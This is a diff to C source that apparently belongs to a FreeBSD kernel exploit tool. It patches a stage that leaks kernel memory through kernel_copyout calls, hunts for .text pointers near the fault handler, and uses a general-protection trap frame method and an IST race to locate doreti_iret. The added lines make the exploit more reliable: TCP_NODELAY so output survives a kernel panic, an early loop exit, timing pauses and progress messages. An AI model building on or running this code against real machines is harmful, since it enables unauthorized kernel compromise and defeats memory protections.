@@ -50,6 +50,7 @@ along with this program; see the file COPYING. If not, see
 #include <sys/mman.h>
 #include <sys/syscall.h>
 #include <netinet/in.h>
+#include <netinet/tcp.h>
 #include <arpa/inet.h>
 #include <threads.h>
 #include <ucontext.h>
@@ -4260,6 +4261,13 @@ broad_done:
         }
 
     if (!have_strong_candidate && have_text_pa) {
+        /* Force TCP to send each write immediately — prevents output
+         * from being lost in Nagle buffers if a later kernel op panics */
+        {
+            int nodelay = 1;
+            setsockopt(sock, IPPROTO_TCP, TCP_NODELAY,
+                       &nodelay, sizeof(nodelay));
+        }
         send_response(sock, "\n--- Step 7: #GP Trap Frame Method ---\n");
         if (num_candidates == 0)
             send_response(sock, "No candidates from previous steps; trying IST race.\n\n");
@@ -4959,12 +4967,24 @@ broad_done:
                         num_near_ptrs++;
                     }
                 }
+
+                /* Stop early once we have enough pointers — continuing
+                 * would only add more kernel_copyout calls with no
+                 * storage for additional unique pointers. */
+                if (num_near_ptrs >= MAX_NEAR_PTRS)
+                    break;
             }
 
             send_response(sock, "  Found %d unique .text pointers "
                           "near handler\n", num_near_ptrs);
 
+            /* Yield to let any deferred kernel work complete after
+             * the heavy .data scan (thousands of kernel_copyout calls
+             * through the pipe buffer). */
+            usleep(10000); /* 10ms */
+
             if (num_near_ptrs > 0) {
+                send_response(sock, "  [sorting by distance...]\n");
                 /* Sort by absolute distance from handler */
                 for (int i = 0; i < num_near_ptrs - 1; i++) {
                     int best = i;
@@ -4987,6 +5007,7 @@ broad_done:
                     }
                 }
 
+                send_response(sock, "  [checking V/V+2 pairs...]\n");
                 /* V/V+2 pair check FIRST — zero kernel ops, zero risk.
                  * doreti_iret is iretq (2 bytes: 0x48 0xcf), so
                  * doreti_iret_fault = doreti_iret + 2.  FreeBSD's
@@ -5171,6 +5192,7 @@ broad_done:
          * page table entries, so different permissions are possible.
          */
         if (gp_handler_va != 0) {
+            usleep(10000); /* 10ms breather before kernel VA read */
             send_response(sock, "\n7b+. Strategy C: kernel VA text "
                           "read test...\n");
 
